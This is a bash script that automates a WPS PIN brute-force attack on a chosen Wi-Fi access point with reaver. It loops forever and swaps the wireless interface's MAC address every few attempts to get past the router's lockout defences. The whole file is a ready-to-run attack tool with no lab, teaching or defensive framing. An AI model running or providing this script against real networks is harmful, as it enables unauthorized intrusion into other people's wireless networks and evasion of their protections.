#!/bin/bash

command_exists() {
        command -v "$1" > /dev/null 2>&1
}

# Check required tools
if ! command_exists reaver || ! command_exists macchanger; then
        echo "[Error] Reaver and macchanger must be installed."
        exit 1
fi

help() {
        echo "Usage: $0 -i <interface> -b <BSSID> -c <channel> [-r <reaver_options] [-a <attempts>]"
        echo ""
        echo "Options:"
        echo "  -i <interface>              wireless interface to use (e.g., wlan0mon)"
        echo "  -b <BSSID>                  target BSSID to attack"
        echo "  -c <channel>                channel on which the target network operates"
        echo "  -r <reaver_options>         additional reaver options (optional)"
        echo "  -a <attempts>               number of reaver pin attempts before changing MAC address (defaul: 10)."
        echo ""
        echo "Example:"
        echo "$0 -i wlan0mon -b AA:AA:AA:AA:AA:AA -c 6 -r \"-vv -L\" -a 3"
        exit 1
}

# Default values
ATTEMPTS=3
REAVER_OPTIONS=""

# Parse arguments
while getopts ":i:b:c:r:a:" opt; do
        case $opt in
                i) INTERFACE="$OPTARG" ;;
                b) BSSID="$OPTARG" ;;
                c) CHANNEL="$OPTARG" ;;
                r) REAVER_OPTIONS="$OPTARG" ;;
                a) ATTEMPTS="$OPTARG" ;;
                *) help ;;
        esac
done

# Validate arguments
if [ -z "$INTERFACE" ] || [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
        help
fi

change_mac() {
        echo "[*] Changing MAC address..."
        sudo ip link set $INTERFACE down
        sudo macchanger -A $INTERFACE
        sudo ip link set $INTERFACE up
        NEW_MAC=$(ip link show $INTERFACE | grep -oE '([[:xdigit:]]{2}:){5}[[:xdigit:]]{2}')
}
run_reaver() {
        echo "[*] Running reaver..."
        sudo reaver -i $INTERFACE -b $BSSID -c $CHANNEL -g $ATTEMPTS -m $NEW_MAC $REAVER_OPTIONS 
}

while true; do
        change_mac
        run_reaver
        # Wait user for interrupt process 
        sleep 3
done

